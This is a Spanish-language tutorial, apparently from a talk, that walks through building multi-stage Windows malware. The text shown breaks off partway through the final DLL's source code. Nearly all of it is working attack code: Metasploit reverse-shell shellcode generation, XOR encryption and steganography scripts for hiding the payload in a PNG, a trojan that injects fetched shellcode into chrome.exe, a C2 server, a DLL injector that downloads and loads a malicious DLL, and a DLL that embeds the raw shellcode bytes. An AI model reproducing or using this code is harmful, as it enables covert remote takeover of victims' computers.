@@ -1,0 +1,1159 @@
+<h2>PONENCIA: Desarrollo de malware</h2>
+<p>by @n3xu5_666</p>
+<p>El malware de este curso es una PoC cuyo objetivo es realizar una inyección de shellcode en un proceso remoto arbitrario y obtener una reverse shell.</p>
+<ul>
+<li>Arquitectura del malware
+<img src="../img/malwareArchitecture.jpg" alt="malware arch" /></li>
+</ul>
+<p>La ponencia muestra su desarrollo desde Distribucion Linux Debian, sin embargo esto tambien es viable desde el Sistema Operativo Android apoyandonos con el <a href="https://github.com/termux">emulador de terminal Termux</a></p>
+<ul>
+<li>Dependencias en Linux
+<pre><code class="language-bash">apt update &amp;&amp; yes|apt upgrade
+yes|apt install curl mingw-w64 python python-pip rust gcc cargo winehq-stable
+python3 -m pip install pillow numpy azure-cli</code></pre></li>
+<li>Dependencias en Termux
+<pre><code class="language-bash">apt update &amp;&amp; yes|apt upgrade
+yes|apt install curl python python-pip python-pillow python-numpy</code></pre>
+<p>METASPLOIT-FRAMEWORK con <a href="https://github.com/ivam3/termux-packages">Termux-packages</a> de @Ivam3 :</p>
+<pre><code class="language-bash">mkdir -p $PREFIX/etc/apt/sources.list.d
+curl https://raw.githubusercontent.com/ivam3/termux-packages/gh-pages/ivam3-termux-packages.list -o $PREFIX/etc/apt/sources.list.d/ivam3-termux-packages.list
+apt update &amp;&amp; yes|apt upgrade
+yes|apt install metasploit-framework</code></pre></li>
+<li>Dependencias en Alpine
+<pre><code class="language-bash">apk update &amp;&amp; apk upgrade
+apk add python3 python3-dev py3-pip libsodium libffi libffi-dev clang make cmake gcc libc-dev rust cargo mingw-w64-gcc wine
+python3 -m pip install --upgrade pip
+export PKG_CONFIG_PATH=/usr/lib/pkgconfig
+export CARGO_BUILD_TARGET=$(rustc --version --verbose|sed -n 's|host: ||p')
+python3 -m pip install wheel setuptools_rust azure-cli</code></pre></li>
+<li>Creacion de entorno de trabajo
+<pre><code class="language-bash">mkdir -p PoC-maldev &amp;&amp; cd $_ # Crea e ingresa al directorio PoC-maldev</code></pre></li>
+</ul>
+<p>Para conseguir este objetivo, el malware está dividido en tres stages o etapas :</p>
+<ol>
+<li>
+<p>Shellcode Injector (troyan.exe): Esta etapa del malware se encarga de inyectar en un proceso arbitrario (chrome.exe) un shellcode cifrado (dllinyectorencrypted.bin) con XOR (xor.py) y embebido en una imagen (pornhublsb.png) mediante la técnica de esteganografía LSB (lsb.py). Esto lo consigue enviando el PNG a un servidor remoto en la nube que se va a encargar de extraer el shellcode payload del PNG y enviarlo de regreso cifrado hacia la instancia de esta primera etapa en la máquina víctima para después descifrarlo en tiempo de ejecución e finalmente inyectarlo.</p>
+<p>Apoyate con el video de la ponencia en su <a href="https://t.me/Ivam3_Bot">Primera Parte</a> al adquirir tu <a href="https://www.youtube.com/ivam3bycinderella/join">membresia de la comunidad</a></p>
+</li>
+</ol>
+<ul>
+<li>
+<p>Descarga de imagen .png</p>
+<pre><code class="language-bash">curl https://www.iconfinder.com/icons/7150904/download/ico/4096 -o venv/pornhub.png</code></pre>
+</li>
+<li>
+<p>Shellcode Payload:</p>
+<pre><code class="language-bash">
+echo """use payload/windows/x64/shell_reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 0000
+generate -f c -o venv/shellcode.bin
+""" &gt; venv/msfshellcode.rc </code></pre>
+</li>
+</ul>
+<p>msfconsole -q -r venv/msfshellcode.rc</p>
+<pre><code>    Sustituye 0.0.0.0 por tu Protocolo de Internet Local (IPL) y el '0000' por el puerto de tu eleccion.
+
+- Activa el entorno virtual de Python
+```bash
+source venv/bin/activate</code></pre>
+<ul>
+<li>Script PoC-maldev/venv/xor.py
+<pre><code class="language-python">
+import sys</code></pre></li>
+</ul>
+<p>def xor(inputData, encKey):</p>
+<pre><code>encKey = str(encKey)
+l = len(encKey)
+outStr = b""
+
+for i in range(len(inputData)):
+    cde = inputData[i]
+    ck = encKey[i % len(encKey)]
+    outStr += chr(cde ^ ord(ck)).encode('latin-1')
+
+return outStr</code></pre>
+<p>if <strong>name</strong> == &quot;<strong>main</strong>&quot;:</p>
+<pre><code>ENCRYPT_KEY = "wubbalubbadubdub"
+try:
+    plainText = open(sys.argv[1], "rb").read()
+    cipherText = xor(plainText, ENCRYPT_KEY)
+    open("encrypted.bin", "wb").write(cipherText)
+except:
+    #print f"Usage: python3 {sys.argv[0]} &lt;payload file&gt;"
+    sys.exit(1)</code></pre>
+<pre><code>
+- Script PoC-maldev/venv/lsb.py
+```python
+from PIL import Image
+import numpy as np
+import sys
+
+def printHelp():
+
+    print(f"""
+Usage:
+
+Hide message:
+
+python3 {sys.argv[0]} -hide &lt;image path&gt; &lt;message file&gt; &lt;output image path&gt;
+
+Unhide message:
+
+python3 {sys.argv[0]} -extract &lt;image path&gt;
+            """)
+
+def hideBits(orig, msgFile, dest):
+
+    img = Image.open(orig,'r')
+    width, height = img.size
+    array = np.array(list(img.getdata()))
+    if img.mode == 'RGB':
+        n = 3
+    elif img.mode == 'RGBA':
+        n = 4
+    total_pixels = array.size//n
+    message = open(msgFile, "rb")
+    message = message.read()
+    message += b"$end_of_message$"
+    b_message = ''.join([format(i, "08b") for i in message])
+    req_pixels = len(b_message)
+    if req_pixels &gt; total_pixels:
+        print("ERROR: Need larger file size")
+    else:
+        index = 0
+        for p in range(total_pixels):
+            for q in range(0,3):
+                if index &lt; req_pixels:
+                    array[p][q] = int(bin(array[p][q])[2:9] + b_message[index],2)
+                    index += 1
+        array = array.reshape(height, width, n)
+        enc_img = Image.fromarray(array.astype('uint8'), img.mode)
+        enc_img.save(dest)
+        print("\nHidden message successfully!\n")
+
+def extract(path):
+
+    img = Image.open(path, 'r')
+    array = np.array(list(img.getdata()))
+    if img.mode == 'RGB':
+        n = 3
+    elif img.mode == 'RGBA':
+        n = 4
+    total_pixels = array.size//n
+    hidden_bits = ""
+    for p in range(total_pixels):
+        for q in range(0,3):
+            hidden_bits += (bin(array[p][q])[2:][-1])
+    hidden_bits = [hidden_bits[i:i+8] for i in range(0, len(hidden_bits), 8)]
+    message = b""
+    for i in range(len(hidden_bits)):
+        if message[-16:] == b"$end_of_message$":
+            break
+        else:
+            message += chr(int(hidden_bits[i],2)).encode('latin-1')
+    dstFile = open("message.bin", "wb")
+    if b"$end_of_message" in message:
+        dstFile.write(message[:-16])
+        print("\nUnhidden message successfully!\n")
+    else:
+        print("\nNo Hidden Message Found\n")
+
+if __name__ == "__main__":
+
+    if len(sys.argv) != 5 and len(sys.argv) != 3:
+        printHelp()
+        sys.exit(1)
+    if sys.argv[1] != "-hide" and sys.argv[1] != "-extract":
+        printHelp()
+        sys.exit(1)
+    if sys.argv[1] == "-hide":
+        if len(sys.argv) != 5:
+            printHelp()
+            sys.exit(1)
+        hideBits(sys.argv[2], sys.argv[3], sys.argv[4])
+    else:
+        if len(sys.argv) != 3:
+            printHelp()
+            sys.exit(1)
+        extract(sys.argv[2])</code></pre>
+<ul>
+<li>
+<p>Concatenacion de shellcode de metasploit en el archivo imagen .png</p>
+<pre><code class="language-bash">python3 lsb.py -hide pornhub.png encrypted.bin pornhublsb.png</code></pre>
+</li>
+<li>
+<p>Desactivamos el entorno virtual de Python</p>
+<pre><code class="language-bash">deactivate</code></pre>
+</li>
+<li>
+<p>Script PoC-maldev/resources.h</p>
+<pre><code class="language-cpp">#define MY_ICON 200</code></pre>
+</li>
+<li>
+<p>Script PoC-maldev/resources.rc</p>
+<pre><code class="language-cpp">
+#include "resources.h"</code></pre>
+</li>
+</ul>
+<p>MY_ICON RCDATA pornhublsb.png</p>
+<pre><code>
+- Script PoC-maldev/trojan.cpp
+```cpp
+// C++ headers
+#include &lt;winsock2.h&gt; // Socket header
+#include &lt;windows.h&gt; // Win API header
+#include &lt;ws2tcpip.h&gt; // TCP/IP header
+#include &lt;tlhelp32.h&gt; // Tool Help Library header
+
+// C headers
+#include &lt;stdio.h&gt; // Standard Input/Output header
+#include &lt;stdlib.h&gt; // Standard library header
+#include &lt;string.h&gt; // Standard string header
+
+// Defined header
+#include "resources.h"
+
+#pragma comment(lib, "user32.lib")
+#pragma comment(lib, "Advapi32.lib")
+#pragma comment(lib, "Shell32.lib")
+#pragma comment(lib, "Ws2_32.lib")
+
+#define DEFAULT_BUFLEN 1024
+
+typedef SSIZE_T ssize_t;
+
+// https://cplusplus.com/forum/general/266899/
+void SendBytes(char * bytes, size_t data_length) {
+
+  WSADATA wsaver;
+  WSAStartup(MAKEWORD(2, 2), &amp;wsaver);
+  SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+  sockaddr_in addr;
+  addr.sin_family = AF_INET;
+  addr.sin_addr.s_addr = inet_addr("192.168.100.18");
+    addr.sin_port = htons(4444);
+
+    char response[DEFAULT_BUFLEN] = "";
+    ssize_t bytes_sent;
+    size_t total_bytes_sent;
+
+    if (connect(tcpsock, (SOCKADDR *) &amp;addr, sizeof(addr)) == SOCKET_ERROR) {
+        closesocket(tcpsock);
+        WSACleanup();
+        exit(0);
+    }
+    else {
+        while (true) {
+            if (data_length &gt;= DEFAULT_BUFLEN) {
+                bytes_sent = send(tcpsock, bytes, DEFAULT_BUFLEN, 0);
+            }
+            else {
+                bytes_sent = send(tcpsock, bytes, data_length, 0);
+                break;
+            }
+
+            recv(tcpsock, response, DEFAULT_BUFLEN, 0);
+
+            if (strcmp(response, "OK") == 0) {
+                //printf("\nResponse: %s\n", response);
+                bytes += bytes_sent;
+                data_length -= bytes_sent;
+                total_bytes_sent += bytes_sent;
+                //printf("Bytes left = %d , Total bytes sent = %d\n", data_length, total_bytes_sent);
+            }
+        }
+        char END[] = "";
+        send(tcpsock, END, strlen(END), 0);
+        closesocket(tcpsock);
+        WSACleanup();
+    }
+}
+
+void RecvBytes(char * bytes, size_t data_length) {
+
+    WSADATA wsaver;
+    WSAStartup(MAKEWORD(2, 2), &amp;wsaver);
+    SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    sockaddr_in addr;
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = inet_addr("0.0.0.0");
+    addr.sin_port = htons(0000);
+
+    char response[DEFAULT_BUFLEN] = "";
+    ssize_t bytes_recived;
+    size_t total_bytes_recieved;
+
+    //printf("\n%-20s : 0x%-016p\n", "Response addr", (void *) response);
+
+    if (connect(tcpsock, (SOCKADDR *) &amp;addr, sizeof(addr)) == SOCKET_ERROR) {
+        closesocket(tcpsock);
+        WSACleanup();
+        exit(0);
+    }
+    else {
+        while (true) {
+            if (data_length &gt;= DEFAULT_BUFLEN) {
+                bytes_recived = recv(tcpsock, response, DEFAULT_BUFLEN, 0);
+                memcpy(bytes, response, DEFAULT_BUFLEN);
+                memset(response, 0, DEFAULT_BUFLEN);
+            }
+            else {
+                bytes_recived = recv(tcpsock, response, data_length, 0);
+                memcpy(bytes, response, data_length);
+                memset(response, 0, data_length);
+                break;
+            }
+
+            send(tcpsock, "OK", 2, 0);
+
+            if (bytes_recived != 0) {
+                //printf("\nResponse: %s\n", response);
+                bytes += bytes_recived;
+                data_length -= bytes_recived;
+                total_bytes_recieved += bytes_recived;
+                //printf("\nBytes left = %d , Total bytes recieved = %d\n", data_length, total_bytes_recieved);
+            }
+        }
+        closesocket(tcpsock);
+        WSACleanup();
+
+        /*
+        recv(tcpsock, response, DEFAULT_BUFLEN, 0);
+        strncpy(bytes, response, data_length);
+        closesocket(tcpsock);
+        WSACleanup();
+        */
+
+    }
+}
+
+void XOR(char * encrypted_data, size_t data_length, char * key, size_t key_length) {
+
+    int key_index = 0;
+    for (int i = 0; i &lt; data_length; i++) {
+        if (key_index == key_length - 1) key_index = 0;
+        encrypted_data[i] = encrypted_data[i] ^ key[key_index];
+        key_index++;
+    }
+}
+
+int SearchForProcess(const char *processName) {
+
+    HANDLE hSnapshotOfProcesses;
+    PROCESSENTRY32 processStruct;
+    int pid = 0;
+
+    hSnapshotOfProcesses = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (INVALID_HANDLE_VALUE == hSnapshotOfProcesses) return 0;
+
+    processStruct.dwSize = sizeof(PROCESSENTRY32);
+
+    if (!Process32First(hSnapshotOfProcesses, &amp;processStruct)) {
+        CloseHandle(hSnapshotOfProcesses);
+        return 0;
+    }
+
+    while (Process32Next(hSnapshotOfProcesses, &amp;processStruct)) {
+        if (lstrcmpiA(processName, processStruct.szExeFile) == 0) {
+            pid = processStruct.th32ProcessID;
+            break;
+        }
+    }
+
+    CloseHandle(hSnapshotOfProcesses);
+
+    return pid;
+}
+
+int ShellcodeInject(HANDLE hProcess, unsigned char * shellcodePayload, unsigned int lengthOfShellcodePayload) {
+
+    LPVOID pRemoteProcAllocMem = NULL;
+    HANDLE hThread = NULL;
+    pRemoteProcAllocMem = VirtualAllocEx(hProcess, NULL, lengthOfShellcodePayload, MEM_COMMIT, PAGE_EXECUTE_READ);
+    WriteProcessMemory(hProcess, pRemoteProcAllocMem, (PVOID)shellcodePayload, (SIZE_T)lengthOfShellcodePayload, (SIZE_T *)NULL);
+
+    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteProcAllocMem, NULL, 0, NULL);
+
+    if (hThread != NULL) {
+        WaitForSingleObject(hThread, 500);
+        CloseHandle(hThread);
+        return 0;
+    }
+    return -1;
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+//int main() {
+
+    BOOL retval;
+    HANDLE threadHandle;
+    DWORD oldprotect = 0;
+    HGLOBAL resHandle = NULL;
+    HRSRC res;
+
+    char response[DEFAULT_BUFLEN] = "";
+    unsigned char * bytes;
+    unsigned int lengthOfBytes;
+    void * shellcodePayload;
+    unsigned int lengthOfShellcodePayload = 119038;
+
+    shellcodePayload = malloc(lengthOfShellcodePayload);
+    memset(shellcodePayload, 0, lengthOfShellcodePayload);
+
+    char encryption_key[] = "wubbalubbadubdub";
+    int pid = 0;
+
+    HANDLE hProcess;
+
+    // Retrieve shellcode payload from resources section
+    res = FindResource(NULL, MAKEINTRESOURCE(MY_ICON), RT_RCDATA);
+    resHandle = LoadResource(NULL, res);
+    bytes = (unsigned char *) LockResource(resHandle);
+    lengthOfBytes = SizeofResource(NULL, res);
+
+    //printf("\n%-20s : 0x%-016p\n", "Bytes addr", (void *) bytes);
+    //printf("\n%-20s : 0x%-016p\n", "Shellcode payload addr", (void *) shellcodePayload);
+
+    // Send ICO bytes and recive encrypted shellcode bytes
+    SendBytes((char *) bytes, lengthOfBytes);
+    RecvBytes((char *) shellcodePayload, lengthOfShellcodePayload);
+    //printf("\nPress Enter to Decrypt Shellcode Payload\n");
+    //getchar();
+
+    // Decrypt the XOR payload to original shellcode
+    XOR((char *) shellcodePayload, lengthOfShellcodePayload, encryption_key, sizeof(encryption_key));
+
+    // Injection
+    pid = SearchForProcess("chrome.exe");
+    if (pid) {
+        //printf("chrome.exe PID = %d\n", pid);
+
+        // try to open target process
+        hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD) pid);
+        //printf("\nhProcess = %x\n", hProcess);
+        //printf("\nPress Enter to Inject the Shellcode Payload\n");
+        //getchar();
+
+        if (hProcess != NULL) {
+            ShellcodeInject(hProcess, (unsigned char *) shellcodePayload, lengthOfShellcodePayload);
+            CloseHandle(hProcess);
+        }
+    }
+    return 0;
+}</code></pre>
+<ul>
+<li>Script PoC-maldev/compile.sh : Script de compilación para Linux (Bash)
+<pre><code class="language-bash">
+#!/bin/bash</code></pre></li>
+</ul>
+<p>x86_64-w64-mingw32-windres -o resources.o resources.rc
+x86_64-w64-mingw32-g++ -o trojan trojan.cpp -lwsock32 -lws2_32 -Wl,--subsystem,windows resources.o</p>
+<pre><code>
+- Script PoC-maldev/compile.bat : Script de compilación para para Windows
+```bat
+@ECHO OFF
+
+rc /nologo resources.rc
+cvtres /nologo /MACHINE:x64 /OUT:resources.o resources.res
+cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tp trojan.cpp /link /OUT:trojan.exe /SUBSYSTEM:WINDOWS /MACHINE:x64 resources.o</code></pre>
+<ul>
+<li>
+<p>Compilacion
+Se requieren en el mismo directorio los archivos :</p>
+<p>• trojan.cpp
+• resources.rc
+• resources.h
+• imageninfectada.png
+• compile.sh</p>
+<pre><code class="language-bash">bash compile.sh</code></pre>
+</li>
+</ul>
+<p>O alternativamente en Windows:</p>
+<pre><code class="language-bat">compile.bat</code></pre>
+<p>Dudas? ... Unete a la <a href="https://t.me/Ivam3by_Cinderella/22">charla</a> en nuestro <a href="https://t.me/Ivam3by_Cinderella">Chat de Telegram</a></p>
+<ol start="2">
+<li>
+<p>Dropper y DLL Injector (dllinjector.exe): Esta etapa del malware descarga un DLL malicioso (evildll.dll) desde el servidor en la nube, lo carga y ejecuta en el proceso inyectado (chrome.exe) haciendo uso de LoadLibraryA. Esta etapa del malware se usa en formato de shellcode payload (dllinjector.bin) y para transformarlo a este formato nos apoyamos de la herramienta <a href="https://github.com/TheWover/donut">Donut</a>.</p>
+<p>Apoyate con el video de la ponencia en su <a href="https://t.me/Ivam3_Bot">Segunda Parte</a> al adquirir tu <a href="https://www.youtube.com/ivam3bycinderella/join">Membresia de la comunidad</a></p>
+</li>
+</ol>
+<ul>
+<li>Script PoC-maldev/server1.py
+<pre><code class="language-python3">
+import socket
+import sys
+import numpy as np
+from PIL import Image</code></pre></li>
+</ul>
+<p>class Server:
+def init(self, ip, port):
+self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+self.server.bind((ip, port))
+self.server.listen(1)
+self.server.settimeout(20)</p>
+<p>def run(self):
+while True:
+try:
+client, address = self.server.accept()
+print(f&quot;\nIncoming connection from {address[0]}:{address[1]}\n&quot;)</p>
+<pre><code>    # Recive image bytes and extract encrypted shellcode
+    print("Receiving icon bytes...")
+    with open("file.bin", "wb") as file:
+      while True:
+        data = client.recv(1024)
+        #print(data)
+        if data == b"":
+          client.close()
+          break
+        client.send("OK".encode('latin-1'))
+        file.write(data)
+      file.close()
+    self.extractBits("file.bin")
+
+    client, address = self.server.accept()
+    print(f"\nIncoming connection from {address[0]}:{address[1]}\n")
+
+    # Send extracted encrypted shellcode bytes
+    print("Sending encrypted shellcode...\n")
+    with open("encrypted.bin", "rb") as file:
+      while True:
+        byte_content = file.read(1024)
+        if not byte_content:
+          client.close()
+          break
+        client.send(byte_content)
+        data = client.recv(1024)
+        #print(f"Bytes sent: {byte_content}")
+        #print(f"Bytes recieved: {data}")
+        if data == "OK":
+          next
+    print("Encrypted shellcode sent...\n")
+
+    #print("Sending encrypted shellcode...\n")
+    #with open("encrypted.bin", "rb") as file:
+    #  byte_content = file.read(1024)
+    #  client.send(byte_content)
+    #print("Encrypted shellcode sent...\n")
+    #client.close()
+
+  except KeyboardInterrupt:
+    print("")
+    sys.exit()
+  except Exception as e:
+    print(f"Error: {e}")
+    pass</code></pre>
+<p>def extractBits(self, path):
+img = Image.open(path, 'r')
+array = np.array(list(img.getdata()))
+if img.mode == 'RGB':
+n = 3
+elif img.mode == 'RGBA':
+n = 4
+total_pixels = array.size//n
+hidden_bits = &quot;&quot;
+for p in range(total_pixels):
+for q in range(0,3):
+hidden_bits += (bin(array[p][q])[2:][-1])
+hidden_bits = [hidden_bits[i:i+8] for i in range(0, len(hidden_bits), 8)]
+message = b&quot;&quot;
+for i in range(len(hidden_bits)):
+if message[-16:] == b&quot;$end_of_message$&quot;:
+break
+else:
+message += chr(int(hidden_bits[i],2)).encode('latin-1')
+dstFile = open(&quot;encrypted.bin&quot;, &quot;wb&quot;)
+if b&quot;$end_of_message&quot; in message:
+dstFile.write(message[:-16])
+dstFile.close()
+print(&quot;\nUnhidden message successfully!\n&quot;)
+else:
+print(&quot;\nNo Hidden Message Found\n&quot;)</p>
+<p>if name == &quot;main&quot;:
+server = Server(&quot;192.168.100.18&quot;, 4444)
+server.run()</p>
+<pre><code>
+- Script PoC-maldev/dllinjector.cpp
+```cpp
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;tlhelp32.h&gt;
+#include &lt;urlmon.h&gt;
+#include &lt;wininet.h&gt;
+
+#pragma comment(lib, "Urlmon.lib")
+#pragma comment(lib, "Wininet.lib")
+
+int SearchForProcess(const char *processName) {
+
+    HANDLE hSnapshotOfProcesses;
+    PROCESSENTRY32 processStruct;
+    int pid = 0;
+
+    hSnapshotOfProcesses = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (INVALID_HANDLE_VALUE == hSnapshotOfProcesses) return 0;
+
+    processStruct.dwSize = sizeof(PROCESSENTRY32); 
+
+    if (!Process32First(hSnapshotOfProcesses, &amp;processStruct)) {
+        CloseHandle(hSnapshotOfProcesses);
+        return 0;
+    }
+
+    while (Process32Next(hSnapshotOfProcesses, &amp;processStruct)) {
+        if (lstrcmpiA(processName, processStruct.szExeFile) == 0) {
+            pid = processStruct.th32ProcessID;
+            break;
+        }
+    }
+
+    CloseHandle(hSnapshotOfProcesses);
+
+    return pid;
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+//int main(int argc, char *argv[]) {
+
+    HANDLE hProcess;
+    PVOID pRemoteProcAllocMem;
+    PTHREAD_START_ROUTINE pLoadLibrary = NULL;
+    //char pathToDLL[] = "C:\\Users\\sciar\\AppData\\Local\\Temp\\evildll.dll";
+    //char pathToDLL[] = "C:\\Program Files\\Google\\Chrome\\Application\\108.0.5359.125\\evildll.dll";
+    //char pathToDLL[] = "C:\\Users\\sciar\\Desktop\\CrashCourseMaldev\\Part2\\evildll.dll";
+    //char pathToDLL[] = "C:\\mspaintDLL.dll";
+    char pathToDLL[MAX_PATH] = "";
+    char url[] = "http://0.0.0.0:80/evildll.dll";
+    char processToInject[] = "chrome.exe";
+    int pid = 0;
+
+    GetTempPath(MAX_PATH, pathToDLL);
+    strcat(pathToDLL, "\\evildll.dll");
+
+    URLDownloadToFile(NULL, (char *) url, (char *) pathToDLL, 0, NULL);
+    DeleteUrlCacheEntry((char *) url);
+
+    pid = SearchForProcess(processToInject);
+    if ( pid == 0) {
+        //printf("Process To Inject NOT FOUND! Exiting.\n");
+        return -1;
+    }
+
+    //printf("Process To Inject PID: [ %d ]\nInjecting...", pid);
+
+    pLoadLibrary = (PTHREAD_START_ROUTINE) GetProcAddress( GetModuleHandle("Kernel32.dll"), "LoadLibraryA");
+
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)(pid));
+
+    if (hProcess != NULL) {
+        pRemoteProcAllocMem = VirtualAllocEx(hProcess, NULL, sizeof(pathToDLL), MEM_COMMIT, PAGE_READWRITE);    
+
+        WriteProcessMemory(hProcess, pRemoteProcAllocMem, (LPVOID) pathToDLL, sizeof(pathToDLL), NULL);
+
+        CreateRemoteThread(hProcess, NULL, 0, pLoadLibrary, pRemoteProcAllocMem, 0, NULL);
+        //printf("done!\nallocated Memory addr = %p\n", pRemoteProcAllocMem);
+
+        CloseHandle(hProcess); 
+    }
+    else {
+        //printf("OpenProcess failed! Exiting.\n");
+        return -2;
+    }
+}</code></pre>
+<ol start="3">
+<li>DLL Malicioso (evildll.dll): Esta etapa del malware es un DLL que se va a encargar de ejecutar un shellcode payload malicioso en la memoria del proceso inyectado, justo cuando es cargado en la memoria de ejecución, que nos va a dar una reverse shell, conectándose directamente al servidor C2 en la nube. Para conseguir esto realiza el proceso estándar de un shellcode loader.</li>
+</ol>
+<ul>
+<li>Script PoC-maldev/evildll.cpp
+<pre><code class="language-cpp">
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;</code></pre></li>
+</ul>
+<p>// Msfconsole reverse shell shellcode generetad with: LHOST=192.168.100.18, LPORT=443, generate -f c -o shellcode.bin
+unsigned char shellcodePayload[460] = {
+0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
+0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
+0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
+0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
+0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
+0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
+0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
+0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
+0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
+0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
+0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
+0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
+0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
+0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
+0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
+0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
+0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x49,
+0xBE, 0x77, 0x73, 0x32, 0x5F, 0x33, 0x32, 0x00, 0x00, 0x41, 0x56, 0x49,
+0x89, 0xE6, 0x48, 0x81, 0xEC, 0xA0, 0x01, 0x00, 0x00, 0x49, 0x89, 0xE5,
+0x49, 0xBC, 0x02, 0x00, 0x01, 0xBB, 0xC0, 0xA8, 0x64, 0x12, 0x41, 0x54,
+0x49, 0x89, 0xE4, 0x4C, 0x89, 0xF1, 0x41, 0xBA, 0x4C, 0x77, 0x26, 0x07,
+0xFF, 0xD5, 0x4C, 0x89, 0xEA, 0x68, 0x01, 0x01, 0x00, 0x00, 0x59, 0x41,
+0xBA, 0x29, 0x80, 0x6B, 0x00, 0xFF, 0xD5, 0x50, 0x50, 0x4D, 0x31, 0xC9,
+0x4D, 0x31, 0xC0, 0x48, 0xFF, 0xC0, 0x48, 0x89, 0xC2, 0x48, 0xFF, 0xC0,
+0x48, 0x89, 0xC1, 0x41, 0xBA, 0xEA, 0x0F, 0xDF, 0xE0, 0xFF, 0xD5, 0x48,
+0x89, 0xC7, 0x6A, 0x10, 0x41, 0x58, 0x4C, 0x89, 0xE2, 0x48, 0x89, 0xF9,
+0x41, 0xBA, 0x99, 0xA5, 0x74, 0x61, 0xFF, 0xD5, 0x48, 0x81, 0xC4, 0x40,
+0x02, 0x00, 0x00, 0x49, 0xB8, 0x63, 0x6D, 0x64, 0x00, 0x00, 0x00, 0x00,
+0x00, 0x41, 0x50, 0x41, 0x50, 0x48, 0x89, 0xE2, 0x57, 0x57, 0x57, 0x4D,
+0x31, 0xC0, 0x6A, 0x0D, 0x59, 0x41, 0x50, 0xE2, 0xFC, 0x66, 0xC7, 0x44,
+0x24, 0x54, 0x01, 0x01, 0x48, 0x8D, 0x44, 0x24, 0x18, 0xC6, 0x00, 0x68,
+0x48, 0x89, 0xE6, 0x56, 0x50, 0x41, 0x50, 0x41, 0x50, 0x41, 0x50, 0x49,
+0xFF, 0xC0, 0x41, 0x50, 0x49, 0xFF, 0xC8, 0x4D, 0x89, 0xC1, 0x4C, 0x89,
+0xC1, 0x41, 0xBA, 0x79, 0xCC, 0x3F, 0x86, 0xFF, 0xD5, 0x48, 0x31, 0xD2,
+0x48, 0xFF, 0xCA, 0x8B, 0x0E, 0x41, 0xBA, 0x08, 0x87, 0x1D, 0x60, 0xFF,
+0xD5, 0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D,
+0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB,
+0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41,
+0x89, 0xDA, 0xFF, 0xD5
+};</p>
+<p>unsigned int lengthOfshellcodePayload = sizeof(shellcodePayload);</p>
+<p>extern __declspec(dllexport) int Go(void);
+int RunShellcode(void) {</p>
+<pre><code>void * alloc_mem;
+BOOL retval;
+HANDLE threadHandle;
+DWORD oldprotect = 0;
+
+alloc_mem = VirtualAlloc(0, lengthOfshellcodePayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+RtlMoveMemory(alloc_mem, shellcodePayload, lengthOfshellcodePayload);
+
